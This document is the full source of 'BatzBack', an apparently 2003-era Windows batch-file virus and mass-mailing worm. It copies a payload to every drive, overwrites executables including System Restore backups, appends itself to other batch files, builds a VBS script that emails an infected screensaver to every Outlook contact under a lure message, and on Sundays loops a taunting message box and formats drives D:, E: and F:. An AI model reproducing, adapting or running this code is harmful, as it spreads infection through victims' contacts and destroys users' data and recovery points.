Echo.
@cls
@echo off
@break off
::BatzBack By L0NEw0lf, CopyRight (C) 2003 L0NEInc.
if exist Z:\ Copy %WinDir%\TASKMOAN.EXE Z:\
if exist Y:\ Copy %WinDir%\TASKMOAN.EXE Y:\
if exist X:\ Copy %WinDir%\TASKMOAN.EXE X:\
if exist W:\ Copy %WinDir%\TASKMOAN.EXE W:\
if exist V:\ Copy %WinDir%\TASKMOAN.EXE V:\
if exist U:\ Copy %WinDir%\TASKMOAN.EXE U:\
if exist T:\ Copy %WinDir%\TASKMOAN.EXE T:\
if exist S:\ Copy %WinDir%\TASKMOAN.EXE S:\
if exist R:\ Copy %WinDir%\TASKMOAN.EXE R:\
if exist Q:\ Copy %WinDir%\TASKMOAN.EXE Q:\
if exist P:\ Copy %WinDir%\TASKMOAN.EXE P:\
if exist O:\ Copy %WinDir%\TASKMOAN.EXE O:\
if exist N:\ Copy %WinDir%\TASKMOAN.EXE N:\
if exist M:\ Copy %WinDir%\TASKMOAN.EXE M:\
if exist L:\ Copy %WinDir%\TASKMOAN.EXE L:\
if exist K:\ Copy %WinDir%\TASKMOAN.EXE K:\
if exist J:\ Copy %WinDir%\TASKMOAN.EXE J:\
if exist I:\ Copy %WinDir%\TASKMOAN.EXE I:\
if exist H:\ Copy %WinDir%\TASKMOAN.EXE H:\
if exist G:\ Copy %WinDir%\TASKMOAN.EXE G:\
goto :XP?
:AVCheck
if exist \Progra~1\Norton~1\*.EXE goto :BB
if exist \Progra~1\Norton~2\*.EXE goto :BB
if exist \Progra~1\Symantec\*.EXE goto :BB
if exist \Progra~1\Common~1\Symant~1\*.EXE goto :BB
if exist \Progra~1\Common~1\Symant~1\Script~1\*.EXE goto :BB
if exist \Progra~1\McAfee\VirusScan\*.EXE goto :BB
if exist \Progra~1\McAfee\McAfee FireWall\*.EXE goto :BB
if exist \Progra~1\PandaS~1\PandaA~1\*.EXE goto :BB
if exist \Progra~1\TrendM~1\Pc-cil~1\*.EXE goto :BB
if exist \Progra~1\Comman~1\F-PROT95\*.EXE goto :BB
if exist \Progra~1\ZoneLa~1\ZoneAlarm\*.EXE goto :BB
if exist \Progra~1\TinyPe~1\*.EXE goto :BB
if exist \Progra~1\Kasper~1\*.EXE goto :BB
if exist \Progra~1\Trojan~1\*.EXE goto :BB
if exist \Progra~1\AvPersonal\*.EXE goto :BB
if exist \Progra~1\Grisoft\AVG6\*.EXE goto :BB
if exist \Progra~1\AntiVi~1\*.EXE goto :BB
if exist \Progra~1\QuickH~1\*.EXE goto :BB
if exist \Progra~1\FWIN32\*.EXE goto :BB
if exist \Progra~1\FindVirus\*.EXE goto :BB
if exist \eSafen\*.EXE goto :BB
if exist \f-macro\*.EXE goto :BB
if exist \TBAVW95\*.EXE goto :BB
if exist \VS95\*.EXE goto :BB
if exist \AntiVi~1\*.EXE goto :BB
if exist \ToolKit\FindVirus\*.EXE goto :BB
if exist \PC-Cil~1\*.EXE goto :BB
goto :WriteMail
WriteMail
Echo On Error Resume Next > \BOTtwoFACE.VBS
Echo Function Mail() >> \BOTtwoFACE.VBS
Echo Set C = CreateObject("Outlook.Application") >> \BOTtwoFACE.VBS
Echo Set D = C.GetNameSpace("MAPI") >> \BOTtwoFACE.VBS
Echo Set E = D.AddressLists >> \BOTtwoFACE.VBS
Echo For Each F In E >> \BOTtwoFACE.VBS
Echo If F.AddressEntries.Count <> 0 Then >> \BOTtwoFACE.VBS
Echo G = F.AddressEntries.Count >> \BOTtwoFACE.VBS
Echo For H = 1 To G >> \BOTtwoFACE.VBS
Echo Set I = C.CreateItem(0) >> \BOTtwoFACE.VBS
Echo Set J = F.AddressEntries(H) >> \BOTtwoFACE.VBS
Echo I.To = J.Address >> \BOTtwoFACE.VBS
Echo I.Subject = "Heyhey!" >> \BOTtwoFACE.VBS
Echo I.Body = "Ya know man, I've seen funny things in my life but this screen saver beats them all, You have to check this out." >> \BOTtwoFACE.VBS
Echo I.Attachments.Add "C:\WINDOWS\SYSTEM\BBbLWDB.Scr" >> \BOTtwoFACE.VBS
Echo I.DeleteAfterSubmit = True >> \BOTtwoFACE.VBS
Echo I.Send >> \BOTtwoFACE.VBS
Echo J = "" >> \BOTtwoFACE.VBS
Echo Next >> \BOTtwoFACE.VBS
Echo End If >> \BOTtwoFACE.VBS
Echo Next >> \BOTtwoFACE.VBS
Echo End Function >> \BOTtwoFACE.VBS
Start \BOTtwoFACE.VBS
goto :BB
:BB
Start %WinDir%\.EXE
goto :End
:XP?
Ver | Find "XP"
if errorlevel 1 goto :NT?
if not errorlevel 1 goto :R
:NT?
Ver | Find "NT"
if errorlevel 1 goto :2000?
if not errorlevel 1 goto :R
:2000?
Ver | Find "2000"
if errorlevel 1 goto :I
if not errorlevel 1 goto :R
:R
cacls "\System Volume Information" /E /G %USERNAME%:F
cd "\System Volume Information\_r??????????????????????????????????????????????????????????????????????????????????????????????\RP5"
For %%i In (*.Exe) Do Echo Y | Copy %WinDir%\TASKMOAN.EXE %%i
cd "\System Volume Information\_r??????????????????????????????????????????????????????????????????????????????????????????????\RP10"
For %%i In (*.Exe) Do Echo Y | Copy %WinDir%\TASKMOAN.EXE %%i
cd "\System Volume Information\_r??????????????????????????????????????????????????????????????????????????????????????????????\RP20"
For %%i In (*.Exe) Do Echo Y | Copy %WinDir%\TASKMOAN.EXE %%i
cacls "\System Volume Information" /E /R %USERNAME%
For /R \ %%i In (*.EXE) Do Copy %WinDir%\TASKMOAN.EXE %%i
goto :Check
:Check
For /R \ %%b In (*.Bat) Do Set euk=%%b
Find "BatzBack" %euk%
if errorlevel 1 goto :Go
if not errorlevel 1 goto :Check
:Go
Echo Y | Copy %euk%+%0 %euk%
goto :Sabbath
:I
For %%i In (\_RESTORE\*.Exe \_RESTORE\TEMP\*.Exe) Do Echo Y | Copy %WinDir%\TASKMOAN.EXE %%i
Echo Y | Copy %WinDir%\TASMOAN.EXE \_RESTORE
For %%i In (*.Exe \*.Exe %PATH%\*.Exe %WinDir%\*.Exe %WinDir%\System\*.Exe) Do Echo Y | Copy WinDir\TASKMOAN.EXE %%i
goto :BatCheck
:BatCheck
For %%b In (*.Bat \*.Bat %PATH%\*.Bat %WinDir%\*.Bat %WinDir%\System\*.Bat) Do Set pro=%%b
Find "BatzBack" %pro%
if errorlevel 1 goto :BatGo
if not errorlevel 1 goto :BatCheck
:BatGo
Echo Y | Copy %pro+%0 %pro%
goto :Sabbath
:Sabbath
Echo Y | Date | Find "Sun"
if errorlevel 1 goto :AVCheck
if not errorlevel 1 goto :PayDay
:PayDay
Echo Do > \MessageFromL0NEw0lf.Vbs
Echo MsgBox "You should be ashamed of yourself, you are infected with BatzBack by L0NEw0lf",48,"Message From L0NEw0lf" >> \MessageFromL0NEw0lf.Vbs
Echo Loop >> \MessageFromL0NEw0lf.Vbs
Start \MessageFromL0NEw0lf.vbs
if exist Echo Y | Format D:
if exist Echo Y | Format E:
if exist Echo Y | Format F:
goto :Again
:Again
A:
goto :Again
:End
Echo Y | Del %0
Exit
